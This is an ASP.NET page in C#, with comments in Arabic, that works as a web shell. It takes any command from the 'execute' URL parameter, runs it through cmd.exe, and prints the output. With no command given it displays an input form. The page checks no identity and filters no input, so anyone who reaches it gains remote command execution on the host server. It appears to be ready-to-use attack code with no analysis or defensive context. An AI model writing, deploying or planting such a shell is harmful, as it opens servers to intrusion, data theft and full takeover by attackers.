<%@ Page Language="C#" Debug="false" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        // تحقق إذا تم تمرير المتغير execute في URL
        if (Request["execute"] != null)
        {
            string cmdCommand = Request["execute"];
            if (!string.IsNullOrEmpty(cmdCommand))
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c " + cmdCommand;
                psi.RedirectStandardOutput = true;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;

                Process process = Process.Start(psi);
                string output = process.StandardOutput.ReadToEnd();
                Response.Write("<pre>" + output + "</pre>");
            }
        }
        else
        {
            // إذا لم يتم إدخال أمر، اعرض النموذج لإدخال الأمر
            Response.Write(@"
                <form method='get'>
                    Command: <input type='text' name='execute' />
                    <input type='submit' value='Execute' />
                </form>
            ");
        }
    }
</script>

<html>
<body>
    <!-- لا شيء يظهر هنا عند فتح الصفحة لأول مرة -->
</body>
</html>
